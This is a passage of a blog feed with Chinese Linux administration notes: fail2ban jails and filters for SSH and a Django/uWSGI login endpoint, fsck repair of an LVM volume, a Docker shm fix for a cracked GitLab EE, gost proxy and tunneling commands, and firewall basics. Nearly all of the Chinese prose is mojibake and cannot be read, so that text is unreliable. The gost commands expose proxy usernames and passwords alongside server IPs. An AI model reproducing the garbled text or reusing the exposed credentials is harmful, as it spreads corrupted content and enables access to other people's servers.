alt="2024-04-10-22-01-26"></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fail2ban</title>
      <link href="/2024/04/08/Linux-Maintain/fail2ban/"/>
      <url>/2024/04/08/Linux-Maintain/fail2ban/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#fail2banç¦æ­¢çˆ†ç ´">fail2banï¼šç¦æ­¢çˆ†ç ´</a></li><li><a href="#fail2ban-client">fail2ban-client</a></li><li><a href="#å®æˆ˜è‡ªå®šä¹‰webç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜">å®æˆ˜ï¼šè‡ªå®šä¹‰WEBç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜</a></li></ul><p>2024å¹´4æœˆ8æ—¥ï¼Œæˆ‘å’Œå…¶ä»–å‰ç«¯åŒäº‹åˆä½œå¼€å‘çš„è€ƒè¯•ç³»ç»Ÿï¼Œmysqlæ•°æ®åº“è¢«é»‘ï¼Œå®•æœºã€‚</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-05-54.png" alt="2024-04-09-21-05-54"></p><p>éšåæˆ‘ç¦æ­¢å…¬ç½‘æš´éœ²mysqlæ•°æ®åº“ï¼Œå¼€å§‹ç ”ç©¶å¯¹å…¶ä»–ç½‘ç»œåè®®çš„é˜²æ­¢æš´åŠ›ç ´è§£ï¼Œäºæ˜¯ä½¿ç”¨fail2banå¯¹sshdå’Œhttpçš„çˆ†ç ´è¿›è¡Œé™åˆ¶ã€‚</p><h1 id="fail2banï¼šç¦æ­¢çˆ†ç ´"><a href="#fail2banï¼šç¦æ­¢çˆ†ç ´" class="headerlink" title="fail2banï¼šç¦æ­¢çˆ†ç ´"></a>fail2banï¼šç¦æ­¢çˆ†ç ´</h1><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.myfreax.cominstall-configure-fail2ban-on-ubuntu-20-04/">https://www.myfreax.cominstall-configure-fail2ban-on-ubuntu-20-04/</a></p><p>fail2banæ˜¯æ ¹æ®ä½ é…ç½®å¥½çš„æ—¥å¿—æ–‡ä»¶ï¼Œå’ŒjailæœåŠ¡ï¼Œæ¥ä¸´æ—¶ban ipçš„ï¼Œ<strong>å¦‚æœéœ€è¦æ°¸ä¹…æ‹’ç»æŸä¸ªipï¼Œç›´æ¥æ“ä½œé˜²ç«å¢™ufwæ›´åˆé€‚</strong>ã€‚fail2banåªèƒ½æ ¹æ®é…ç½®å¥½çš„jail_nameæ¥ä¸´æ—¶ban ip.</p><p>ç›´æ¥æ—¥å¿—ä½ç½®: /var/log/fail2ban.log</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-03-27.png" alt="2024-04-09-21-03-27.png"></p><pre><code>apt update &amp;&amp; apt install fail2ban</code></pre><p>åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„ï¼Œå› ä¸ºå®ƒçš„ä¸€äº›é»˜è®¤è®¾ç½®å¯èƒ½ä¼šå¯¼è‡´ä¸è‰¯æ•ˆæœã€‚</p><pre><code>systemctl status fail2banfail2ban.service - Fail2Ban Service    Loaded: loaded (/lib/systemd/system/fail2ban.service; disabled; vendor preset: enabled)    Active: inactive (dead)    Docs: man:fail2ban(1)</code></pre><p>é…ç½®ç›®å½•ï¼š/etc/fail2ban</p><p>é»˜è®¤æœ‰jail.confçš„é…ç½®æ–‡ä»¶ï¼Œä½†æ˜¯<strong>ä¸è¦åŠ¨conf</strong>ï¼Œè‡ªå·±æ–°å»º.localçš„é…ç½®æ–‡ä»¶åœ¨localä¸­ç¼–è¾‘ï¼š</p><pre><code>cp /etc/fail2ban/jail.&#123;conf,local&#125;</code></pre><p>jail.localä¸­æœ‰ä¸‰ä¸ªé‡è¦çš„</p><pre><code>bantime  = 1d  findtime  = 10m  maxretry = 5</code></pre><p>Fail2bané™„å¸¦è®¸å¤šJailä½œä¸ºç¤ºä¾‹ï¼Œç³»ç»Ÿæ¯ä¸€é¡¹æœåŠ¡éƒ½å¯ä»¥æ‰¾åˆ°å¯¹åº”Jailé…ç½®ã€‚ è¦å¯ç”¨Jailï¼Œæ‚¨éœ€è¦åœ¨æ·»åŠ enabled = trueã€‚ ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†å¦‚ä½•ä¸ºsshdæœåŠ¡å¯ç”¨Jailï¼š</p><pre><code>[sshd]enabled   = trueï¼ˆubuntå¯ä»¥ä¸å†™ï¼‰port    = sshlogpath = %(sshd_log)sbackend = %(sshd_backend)s/etc/fail2ban/jail.local</code></pre><p>æ¯æ¬¡ä¿®æ”¹é…ç½®æ–‡ä»¶æ—¶ï¼Œéƒ½å¿…é¡»é‡æ–°å¯åŠ¨Fail2banæœåŠ¡ï¼Œä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š</p><pre><code>sudo systemctl restart fail2ban</code></pre><h1 id="fail2ban-client"><a href="#fail2ban-client" class="headerlink" title="fail2ban-client"></a>fail2ban-client</h1><p>æ£€æŸ¥fail2banç›‘è§†çš„sshdï¼š</p><pre><code>fail2ban-client status sshd</code></pre><p>unban ipï¼š</p><pre><code>fail2ban-client set sshd unbanip 23.34.45.56</code></pre><p>banIPï¼š</p><pre><code>fail2ban-client set sshd banip 23.34.45.56</code></pre><p>æˆ‘è‡ªå·±çˆ†ç ´sshdæµ‹è¯•äº†ä¸‹ï¼Œè¿™é‡Œä¸€æ¬¡sshæœ‰3æ¬¡é‡è¯•å¯†ç æœºä¼šï¼Œç„¶åjailå†™çš„5æ¬¡ï¼Œè¿™é‡Œå…¶å®æµ‹è¯•çš„æ—¶å€™è¾“é”™äº†15æ¬¡å¯†ç ï¼Œæ‰ä¼šè¢«fail2banè®¤ä¸ºæ˜¯è¦bançš„ipã€‚</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-07-36.png" alt="2024-04-09-21-07-36"></p><h1 id="å®æˆ˜ï¼šè‡ªå®šä¹‰WEBç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜"><a href="#å®æˆ˜ï¼šè‡ªå®šä¹‰WEBç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜" class="headerlink" title="å®æˆ˜ï¼šè‡ªå®šä¹‰WEBç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜"></a>å®æˆ˜ï¼šè‡ªå®šä¹‰WEBç³»ç»Ÿdjangoå°ç¦404æˆ–è€…çˆ†ç ´é—®é¢˜</h1><p>æˆ‘æ˜¯ç”¨uwsgiå¯ç”¨çš„djangoï¼Œæ—¥å¿—æ–‡ä»¶ä¸æ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code>/var/log/uwsgi/uwsgi.log[pid: 799467|app: 0|req: 36/44] 129.151.212.54 () &#123;40 vars in 544 bytes&#125; [Tue Apr  9 07:44:07 2024] POST /api/login/ =&gt; generated 41 bytes in 244 msecs (HTTP/1.1 304) 7 headers in 267 bytes (1 switches on core 0)[pid: 799467|app: 0|req: 37/45] 129.151.212.54 () &#123;40 vars in 543 bytes&#125; [Tue Apr  9 07:44:10 2024] POST /api/login/ =&gt; generated 41 bytes in 263 msecs (HTTP/1.1 304) 7 headers in 267 bytes (1 switches on core 0)</code></pre><p>å¯ä»¥çœ‹åˆ°ç™»å½•æ¥å£å“åº”304ï¼Œ</p><p>ç„¶åï¼Œç½‘ç»œåšæ³•é€šå¸¸ä¸ºä½¿ç”¨ æ­£åˆ™è¡¨è¾¾å¼ æµ‹è¯•çœ‹æ˜¯å¦èƒ½åŒ¹é…åˆ°æ—¥å¿—ä¸­æµ‹è¯•æ•°æ®ï¼š<br>ä½†æ˜¯æ­¤å¤„æœ‰å‘ç‚¹ï¼Œæ—¥å¿—ä¸­æœ‰éæ ‡å‡†æ ¼å¼è¡Œï¼Œä¼šç›´æ¥æŠ¥é”™IndexError: string index out of rangeã€‚è¿™ä¸ªé—®é¢˜ä»…ä»…æ˜¯fail2ban-regexæœ¬èº«è¿™ç§å°æµ‹è¯•å·¥å…·çš„é—®é¢˜ã€‚</p><pre><code>fail2ban-regex /var/log/uwsgi/uwsgi.log  &quot;&lt;HOST&gt; \(.*\) .* \(HTTP/[012.]+ [345][0-9][0-9]\)&quot;</code></pre><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-08-29.png" alt="2024-04-09-21-08-29"></p><p>æ­¤æ—¶ä¸ºäº†æµ‹è¯•ï¼Œéœ€è¦æŠŠæµ‹è¯•æ•°æ®å®Œæ•´è¡Œå•ç‹¬æ”¾å¦‚/var/log/uwsgi/uwsgi.log2 çš„æ–‡ä»¶ä¸­æµ‹è¯•æ­£åˆ™ã€‚</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-08-48.png" alt="2024-04-09-21-08-48"></p><p>è¯´æ˜æµ‹è¯•é€šè¿‡ã€‚</p><p>æ–°å»ºjailï¼Œè‡ªè¡Œå‘½å</p><pre><code>vim /etc/fail2ban/jail.d/jail_uwsgi.local[uwsgi]enabled = trueport = 8000protocol = tcpfilter = uwsgilogpath = /var/log/uwsgi/uwsgi.logbantime = 120mfindtime = 10mmaxretry = 15</code></pre><p>æ–°å»ºfilterï¼Œè‡ªè¡Œå‘½å</p><pre><code>vim /etc/fail2ban/filter.d/uwsgi.conf[Definition]failregex = &lt;HOST&gt; \(.*\) .* \(HTTP/[012.]+ [345][0-9][0-9]\)ignoreregex =</code></pre><hr><pre><code>/etc/fail2ban/jail.local (ä¸è¦ç¼–è¾‘jail.conf)ä¸€ä¼—é…ç½®ä¸­æ–°å¢å¦‚ä¸‹ï¼š[uwsgi]# æ­¤å¤„jail.då®šä¹‰å’Œæœ¬åˆjail.localçš„å‚æ•°å¯äº’ç›¸è¿­ä»£æŒ‡å®šï¼Œæ­¤å¤„å¯ä»…å†™ä¸ª[uwsgi]è€Œä¸å†™é…ç½®å‚æ•°ï¼ˆå› ä¸ºæˆ‘çš„æ–¹æ³•ï¼Œåœ¨jailä¸­å·²å†™ï¼‰</code></pre><p>é‡å¯fail2ban</p><pre><code>systemctl restart fail2ban</code></pre><p>è‡ªå·±åœ¨æœ¬åœ°æ‰“15ä¸ª304çš„HTTPè¯·æ±‚åŒ…åï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±çš„IPåœ¨ uwsgi çš„jail ä¸­è¢«banï¼š</p><pre><code>root@racknerd-c012d0:/etc/fail2ban/jail.d# fail2ban-client status uwsgiStatus for the jail: uwsgi|- Filter|  |- Currently failed: 0|  |- Total failed:     15|  `- File list:        /var/log/uwsgi/uwsgi.log`- Actions|- Currently banned: 1|- Total banned:     1`- Banned IP list:   129.151.212.54root@racknerd-c012d0:/etc/fail2ban/jail.d# fail2ban-client status sshdStatus for the jail: sshd|- Filter|  |- Currently failed: 2|  |- Total failed:     6|  `- File list:        /var/log/auth.log`- Actions|- Currently banned: 3|- Total banned:     3`- Banned IP list:   218.92.0.122 218.92.0.22 218.92.0.29</code></pre><p>postmanæ­¤æ—¶ç”±äºè§¦å‘banï¼Œå‘é€ä»…å“åº”503 service unresposable, è§¦å‘ufwçš„rejectè¡Œä¸º</p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fsckï¼šå¼ºè¡Œé‡å¯ç³»ç»Ÿå¯¼è‡´åˆ†åŒºå‡ºç°é—®é¢˜</title>
      <link href="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/"/>
      <url>/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š </p><pre><code>http://c.biancheng.net/view/887.htmlhttps://www.linuxprobe.com/linux-fsck-command.htmlhttps://cloud.tencent.com/developer/article/1721746</code></pre><p>fsckä¿®å¤çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯ç£ç›˜æ— æ³•å¯åŠ¨ã€ç”±äºå¼ºåˆ¶æ–­ç”µç­‰é€ æˆæ–‡ä»¶IOé”™è¯¯ã€ç£ç›˜å†…å®¹é”™è¯¯ä¸€ç±»çš„ï¼ˆè§£å†³çš„æ˜¯ä¿®å¤ç£ç›˜çš„é—®é¢˜ï¼‰</p><h1 id="å¸¸è§çš„5ç§æŸåç±»å‹"><a href="#å¸¸è§çš„5ç§æŸåç±»å‹" class="headerlink" title="å¸¸è§çš„5ç§æŸåç±»å‹"></a>å¸¸è§çš„5ç§æŸåç±»å‹</h1><pre><code>1 æœªè¢«å¼•ç”¨çš„inode2 éš¾ä»¥ç½®ä¿¡çš„è¶…å¤§é“¾æ¥æ•°3 æ²¡æœ‰è®°å½•åœ¨ç£ç›˜å—æ˜ å°„è¡¨ä¸­çš„æœªç”¨æ•°æ®å¿«4 åˆ—å‡ºçš„ç©ºé—²æ•°æ®å¿«è¿˜åœ¨æŸä¸ªæ–‡ä»¶ä¸­ä¾¿ç”¨5 è¶…çº§å—ä¸­ä¸æ­£ç¡®çš„æ±‡æ€»ä¿¡æ¯</code></pre><p>åœ¨ä½¿ç”¨ fsck å‘½ä»¤ä¿®æ”¹æŸæ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œ<strong>è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå¯¹åº”çš„ç£ç›˜åˆ†åŒºä¸€å®šè¦å¤„äºå¸è½½çŠ¶æ€</strong>ï¼Œç£ç›˜åˆ†åŒºåœ¨æŒ‚è½½çŠ¶æ€ä¸‹è¿›è¡Œä¿®å¤æ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œ<strong>æ•°æ®å¯èƒ½ä¼šé­åˆ°ç ´åï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šæŸåç£ç›˜</strong>ã€‚</p><p>å¸¸è§åšæ³•ï¼Œæ˜¯å¯¹æ ¼å¼åŒ–çš„ç£ç›˜è¿›è¡Œä¿®å¤ã€‚<strong>æ³¨æ„ä¸èƒ½ä¿®å¤å·²æŒ‚è½½çš„ç£ç›˜,å¦åˆ™ä¼šå¯¼è‡´æ°¸ä¹…æ€§æŸä¼¤ç£ç›˜ã€‚éœ€è¦å…ˆumountç£ç›˜ï¼Œåœ¨fsckè¿›è¡Œä¿®å¤ã€‚</strong></p><p>æ¨èå‘½ä»¤ï¼š</p><pre><code>fsck -r /dev/sdb1</code></pre><p>æƒ…æ™¯ï¼šæˆ‘è™šæ‹Ÿæœºå¡æ­»çš„æƒ…å†µä¸‹æ— å¥ˆé‡å¯ç”µè„‘ï¼Œé‡æ–°æ‰“å¼€è™šæ‹Ÿæœºåï¼Œå‘ç°å±å¹•ä¸ŠæŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-08-50.png" alt="2024-04-10-22-08-50"></p><p>æˆ‘è™šæ‹Ÿæœºçš„ç£ç›˜ä½¿ç”¨äº†LVMè¿›è¡Œåˆ†é…ï¼Œç„¶åç”±äºä¸Šè¿°åŸå› å‡ºé—®é¢˜äº†ã€‚å¯ä»¥çœ‹åˆ°æŸä¸ªInodeå‡ºç°äº†é—®é¢˜ï¼ˆç»™å‡ºäº†é€»è¾‘blockå’Œç‰©ç†blockçš„ä½ç½®ï¼‰ï¼Œç„¶åè™šæ‹Ÿæœºè‡ªè¡Œè¿›å…¥äº†busyboxçš„å‘½ä»¤ä¸­ï¼Œè¦æ±‚æ‰‹åŠ¨è¿›è¡Œæ£€æµ‹ã€‚</p><p>è¿™é‡Œå› ä¸ºç£ç›˜æœ‰é—®é¢˜ï¼Œlinuxçš„OSæ²¡æœ‰å¯¹è¯¥ç£ç›˜è¿›è¡ŒæŒ‚è½½ï¼Œè€Œæ˜¯ä½¿ç”¨äº†busyboxè¿›è¡Œä¿®å¤ï¼Œæ‰€ä»¥ä½ ä¼šå‘ç°èƒ½ç”¨çš„å‘½ä»¤éƒ½å¾ˆå°‘ï¼Œå› ä¸ºOSæ²¡æœ‰æŒ‚è½½ç£ç›˜ï¼Œä½ æ— æ³•æ‰§è¡Œbinä¸‹å‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°ç›®å‰ä½ æ‰§è¡Œçš„shellæ˜¯ï¼ˆinitramfsï¼‰ï¼Œæ˜¯ç±»ä¼¼äºWin PEä¸€æ ·çš„å†…å­˜OSï¼Œè€Œéç£ç›˜ã€‚</p><p>å› ä¸ºæˆ‘è¿™é‡Œæ¶‰åŠåˆ°lvmçš„ä¿®å¤ï¼Œæ•…å‚è€ƒ<a href="https://www.cnblogs.com/xiangsikai/p/10684828.html">https://www.cnblogs.com/xiangsikai/p/10684828.html</a><br>æˆ‘æ‰§è¡Œlvmè¿›å…¥lvmæ“ä½œï¼Œç„¶åæ‰§è¡Œlvdisplayçœ‹åˆ°lv Pathçš„è·¯å¾„</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-09-24.png" alt="2024-04-10-22-09-24"></p><p>éšåfsck /dev/ubuntu-vg/ubuntu-lv è¿›è¡Œä¿®å¤<br>ä¸€è·¯Yå³å¯</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-09-54.png" alt="2024-04-10-22-09-54"></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gitlab-eeçš„ç ´è§£ç‰ˆè¿”å›500ï¼Œ501å“åº”</title>
      <link href="/2024/04/08/Linux-Maintain/gitlab-ee%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%89%88%E8%BF%94%E5%9B%9E500%EF%BC%8C501%E5%93%8D%E5%BA%94/"/>
      <url>/2024/04/08/Linux-Maintain/gitlab-ee%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%89%88%E8%BF%94%E5%9B%9E500%EF%BC%8C501%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p>é¹å“¥å‚è€ƒè¿‡çš„é“¾æ¥</p><pre><code>https://docs.gitlab.com/ee/install/docker.html#devshm-mount-not-having-enough-space-in-docker-containerhttps://blog.kelu.org/tech/2021/12/16/docker-shm.htmlhttps://blog.csdn.net/weixin_43545410/article/details/120963125</code></pre><h1 id="æ–¹æ³•ä¸€ï¼šå®¹å™¨å¯åŠ¨å‰ä¿®æ”¹"><a href="#æ–¹æ³•ä¸€ï¼šå®¹å™¨å¯åŠ¨å‰ä¿®æ”¹" class="headerlink" title="æ–¹æ³•ä¸€ï¼šå®¹å™¨å¯åŠ¨å‰ä¿®æ”¹"></a>æ–¹æ³•ä¸€ï¼šå®¹å™¨å¯åŠ¨å‰ä¿®æ”¹</h1><pre><code>docker run -it --shm-size=&quot;1g&quot; --name 001 busybox:latest /bin/sh</code></pre><h1 id="æ–¹æ³•äºŒï¼šå®¹å™¨å¯åŠ¨åä¿®æ”¹"><a href="#æ–¹æ³•äºŒï¼šå®¹å™¨å¯åŠ¨åä¿®æ”¹" class="headerlink" title="æ–¹æ³•äºŒï¼šå®¹å™¨å¯åŠ¨åä¿®æ”¹"></a>æ–¹æ³•äºŒï¼šå®¹å™¨å¯åŠ¨åä¿®æ”¹</h1><p>1.docker ps | grep containerName</p><p>2.è·å–å®Œæ•´ Id</p><pre><code>[root@linfs-bigdata containers]# docker inspect 641ae8c59c0d | grep Id    &quot;Id&quot;: &quot;641ae8c59c0d20814d489cdc17a32f6ab3f35e621e5f67c2e0df1cc1b7efa269&quot;,</code></pre><p>3.ä¿®æ”¹ ShmSizeï¼Œå•ä½ä¸º kbï¼Œé»˜è®¤å¤§å°ä¸º 64Mï¼Œä¿®æ”¹å®Œåé‡å¯ docker å°±ç”Ÿæ•ˆäº†</p><pre><code>vim /var/lib/docker/containers/641ae8c59c0d20814d489cdc17a32f6ab3f35e621e5f67c2e0df1cc1b7efa269/hostconfig.json</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gost</title>
      <link href="/2024/04/08/Linux-Maintain/gost/"/>
      <url>/2024/04/08/Linux-Maintain/gost/</url>
      
        <content type="html"><![CDATA[<p>é¡¹ç›®å‚è€ƒ<br><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p><h1 id="ä»£ç†è½¬å‘"><a href="#ä»£ç†è½¬å‘" class="headerlink" title="ä»£ç†è½¬å‘"></a>ä»£ç†è½¬å‘</h1><p>åªè¦æœ¬åœ°å®¢æˆ·ç«¯æ‰§è¡Œ-Lï¼Œå°±å¯ä»¥è½¬å‘httpï¼Œhttpsï¼Œsocksç­‰åè®®çš„è½¬å‘ï¼Œä½†æ˜¯å®æµ‹æˆ‘æ— æ³•httpsè½¬å‘ï¼Œä¼šé‡åˆ°è¯ä¹¦çš„æŠ¥é”™</p><h3 id="kcpåè®®ï¼š-udpå°è£…çš„åè®®"><a href="#kcpåè®®ï¼š-udpå°è£…çš„åè®®" class="headerlink" title="kcpåè®®ï¼š udpå°è£…çš„åè®®"></a>kcpåè®®ï¼š udpå°è£…çš„åè®®</h3><pre><code>server:gost -L kcp://gost:1qaz@WSX@45.77.115.252:52783client:gost -L=:6666 -F=kcp://gost:1qaz@WSX@45.77.115.252:52783</code></pre><h3 id="mwssåè®®ï¼šå¤šåª’ä½“åè®®"><a href="#mwssåè®®ï¼šå¤šåª’ä½“åè®®" class="headerlink" title="mwssåè®®ï¼šå¤šåª’ä½“åè®®"></a>mwssåè®®ï¼šå¤šåª’ä½“åè®®</h3><pre><code>server:./gost -L mwss://fivecolorstone:fivecolorstone@192.210.xxx.99:29753gost -L mwss://fivecolorstone:fivecolorstone@45.77.115.252:29723client:gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@192.210.xxx.99:29753gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@45.77.115.252:29723</code></pre><h1 id="curlæŒ‚ä»£ç†æ£€æµ‹socksä»£ç†"><a href="#curlæŒ‚ä»£ç†æ£€æµ‹socksä»£ç†" class="headerlink" title="curlæŒ‚ä»£ç†æ£€æµ‹socksä»£ç†"></a>curlæŒ‚ä»£ç†æ£€æµ‹socksä»£ç†</h1><p>curl -x socks5://127.0.0.1:1024 <a href="http://www.google.com">http://www.google.com</a> # -x å‚æ•°ç­‰åŒäº â€”proxy</p><p>è®¿é—®ip.sbä¼šç›´æ¥æ˜¾ç¤ºå½“å‰ä½ è¿æ¥çš„ip</p><pre><code>curl -x socks5://127.0.0.1:6666 ip.sb</code></pre><h1 id="åœ¨racknerdçš„socksçš„vpsæ­å»ºçš„å‘ç‚¹"><a href="#åœ¨racknerdçš„socksçš„vpsæ­å»ºçš„å‘ç‚¹" class="headerlink" title="åœ¨racknerdçš„socksçš„vpsæ­å»ºçš„å‘ç‚¹"></a>åœ¨racknerdçš„socksçš„vpsæ­å»ºçš„å‘ç‚¹</h1><p>å¦‚æœæ˜¯AlmaLinuxï¼Œåˆ™ä½¿ç”¨yumå®‰è£… net-tools ç­‰è½¯ä»¶<br>é˜²ç«å¢™ä¸åŒäºubuntuçš„ufwï¼Œä½¿ç”¨firewalld</p><p>éœ€è¦å…³é—­firewalldï¼š</p><pre><code>systemctl stop firewalldsystemctl disable firewalld</code></pre><p>åœ¨å¦‚ä¸‹é“¾æ¥ä¸­æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š<br><a href="https://almalinux.discourse.group/t/no-match-for-argument-screen/790">https://almalinux.discourse.group/t/no-match-for-argument-screen/790</a></p><pre><code>dnf install epel-releasednf install screen</code></pre><p>ç„¶åå† screen -S gostå¼€screençš„shellï¼Œè¿è¡Œå‘½ä»¤<br>mwssåè®®ï¼š</p><pre><code>server:./gost -L mwss://fivecolorstone:fivecolorstone@192.227.xxx.113:39753client:gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@192.227.xxx.113:39753</code></pre><h1 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h1><p>å‚è€ƒå¸–å­ï¼š<br><a href="https://github.com/ginuerzh/gost/issues/745">https://github.com/ginuerzh/gost/issues/745</a></p><p>å‡è®¾Aåœ°å€æ˜¯å…¬ç½‘vpsï¼ŒBæ˜¯æŸå†…ç½‘æœåŠ¡å™¨ï¼ŒCæ˜¯å®¢æˆ·ç«¯<br>Bã€Cä¸èƒ½è®¿é—®ï¼ŒCæƒ³è®¿é—®Bçš„5000ç«¯å£çš„æœåŠ¡ï¼Œéœ€è¦ä»¥Aä¸ºä¸­ç»§ï¼Œgostéƒ¨ç½²å¦‚ä¸‹ï¼š</p><p>Aéƒ¨ç½²ï¼š</p><pre><code>gost -L socks5://:2345 (æ„æ€æ˜¯ï¼Œå»ºç«‹ç«¯å£ä¸º2345çš„gostæœåŠ¡ç«¯ã€‚2345ä»…æ˜¯æœåŠ¡ç«¯ï¼Œç”¨æ¥gostè®¿é—®æ­æ¡¥çš„ï¼Œä¸æ˜¯è®©äººç±»è®¿é—®çš„)</code></pre><p>Béƒ¨ç½²ï¼š</p><pre><code>gost -L rtcp://:8080/:5000 -F socks5://10.80.5.244:2345 (æ„æ€æ˜¯ï¼Œå°†æœºå™¨192.168.217.128ç«¯å£5000ç»‘å®šåˆ°æœºå™¨10.80.5.244ç«¯å£8080ä¸Šã€‚æ­¤å¤„rtcpæ— æ‰€è°“ï¼Œgostæ”¯æŒçš„éƒ½è¡Œ)</code></pre><p>Cè®¿é—®ï¼š</p><pre><code>è®¿é—® A:8080ï¼Œå°±å¯ä»¥è®¿é—®åˆ°B:5000 äº†ã€‚</code></pre><h3 id="æ¡ˆä¾‹ï¼šå°†giteaå†…ç½‘ç©¿é€"><a href="#æ¡ˆä¾‹ï¼šå°†giteaå†…ç½‘ç©¿é€" class="headerlink" title="æ¡ˆä¾‹ï¼šå°†giteaå†…ç½‘ç©¿é€"></a>æ¡ˆä¾‹ï¼šå°†giteaå†…ç½‘ç©¿é€</h3><p>æœåŠ¡ç«¯ï¼ˆ192.227.167.113ï¼‰ï¼š</p><pre><code>./gost -L socks5://:38441</code></pre><p>è¢«ç©¿é€æœºå™¨ï¼š</p><pre><code>gost -L rtcp://:3001/:3000 -F socks5://192.227.xxx.113:38441</code></pre><p>è®¿é—®ï¼š<br><a href="http://192.227.167.113:3001/">http://192.227.167.113:3001/</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ufw</title>
      <link href="/2024/04/08/Linux-Maintain/ufw/"/>
      <url>/2024/04/08/Linux-Maintain/ufw/</url>
      
        <content type="html"><![CDATA[<p>firewallå’Œufwï¼Œä¸¤è€…å®‰è£…å…¶ä¸€å³å¯ï¼Œéƒ½å®‰è£…çš„è¯ä¼šå†²çªã€‚</p><ul><li><a href="#iptables">iptables</a></li><li><a href="#firewalld">firewalld</a></li><li><a href="#ufw">ufw</a><ul><li><a href="#å…è®¸æºipåœ°å€æ¥å£ç½‘å¡">å…è®¸æºIPåœ°å€æ¥å£/ç½‘å¡</a></li><li><a href="#æ‹’ç»è¿æ¥">æ‹’ç»è¿æ¥</a></li><li><a href="#æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™">æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™</a></li><li><a href="#ç¦ç”¨å¯ç”¨">ç¦ç”¨/å¯ç”¨</a></li><li><a href="#ipä¼ªè£…è½¬å‘">IPä¼ªè£…/è½¬å‘</a></li><li><a href="#systemctl-enable-ufwå’Œufw-enableåŒºåˆ«">systemctl enable ufwå’Œufw enableåŒºåˆ«</a></li></ul></li></ul><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p>iptables æ˜¯ä¸€ä¸ªé€šè¿‡æ§åˆ¶ Linux å†…æ ¸çš„ netfilter æ¨¡å—æ¥ç®¡ç†ç½‘ç»œæ•°æ®åŒ…çš„æµåŠ¨ä¸è½¬é€çš„åº”ç”¨è½¯ä»¶ï¼Œå…¶åŠŸèƒ½åŒ…æ‹¬ä¸ä»…ä»…åŒ…æ‹¬é˜²ç«å¢™çš„æ§åˆ¶å‡ºå…¥æµé‡ï¼Œè¿˜æœ‰ç«¯å£è½¬å‘ç­‰ç­‰ã€‚</p><p>iptables å†…éƒ¨æœ‰è¡¨ tablesã€é“¾ chainsã€è§„åˆ™ rules è¿™ä¸‰ç§æ¦‚å¿µã€‚<br>iptables çš„æ¯ä¸€ä¸ª â€œè¡¨â€ éƒ½å’Œä¸åŒçš„æ•°æ®åŒ…å¤„ç†æœ‰å…³ã€å†³å®šæ•°æ®åŒ…æ˜¯å¦å¯ä»¥ç©¿è¶Šçš„æ˜¯ â€œé“¾â€ã€è€Œä¸€æ¡ â€œè§„åˆ™â€ åœ¨é“¾é‡Œé¢åˆ™å¯ä»¥å†³å®šæ˜¯å¦é€å¾€ä¸‹ä¸€æ¡é“¾ï¼ˆæˆ–å…¶å®ƒçš„åŠ¨ä½œï¼‰ã€‚</p><p>iptables æ˜¯ firewall å’Œ ufw çš„åº•å±‚ã€‚</p><h1 id="firewalld"><a href="#firewalld" class="headerlink" title="firewalld"></a>firewalld</h1><p>å¦‚almaLinuxã€centosä½¿ç”¨ firewalld ä¸ºé˜²ç«å¢™ï¼ŒåŒºåˆ«äº ubuntu 